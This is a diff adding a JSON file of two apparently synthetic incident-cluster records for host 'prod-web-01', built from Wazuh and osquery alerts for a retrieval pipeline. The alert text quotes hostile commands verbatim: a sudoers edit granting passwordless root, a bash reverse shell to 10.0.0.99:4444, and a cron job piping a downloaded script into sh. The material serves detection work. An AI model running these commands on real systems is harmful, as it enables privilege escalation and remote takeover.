@@ -1,0 +1,21 @@
+[
+  {
+    "chunk_id": "incident_prod-web-01_0_1790918130",
+    "host": "prod-web-01",
+    "event_count": 2,
+    "max_severity": 12,
+    "mitre_techniques": [
+      "T1548.003",
+      "T1059.004"
+    ],
+    "rag_document": "INCIDENT CLUSTER on Host 'prod-web-01'\nMax Severity Level: 12\nAssociated MITRE ATT&CK: T1548.003, T1059.004\nObserved Activity Timeline (2 events):\n  - [Wazuh Alert] Possible privilege escalation via sudoers modification --> echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\n  - [Wazuh Alert] Reverse shell execution detected --> bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"
+  },
+  {
+    "chunk_id": "incident_prod-web-01_1_1790928935",
+    "host": "prod-web-01",
+    "event_count": 2,
+    "max_severity": 0,
+    "mitre_techniques": [],
+    "rag_document": "INCIDENT CLUSTER on Host 'prod-web-01'\nMax Severity Level: 0\nAssociated MITRE ATT&CK: None\nObserved Activity Timeline (2 events):\n  - [osquery Host Event] Process execution audit (pack_incident_response_process_events) --> Binary: /bin/bash | PID: 4312 | Command: bash -i >& /dev/tcp/10.0.0.99/4444 0>&1\n  - [osquery Host Event] Process execution audit (pack_compliance_crontab) --> Binary: /etc/crontab | PID: None | Command: curl http://10.0.0.99/mal.sh | sh"
+  }
+]
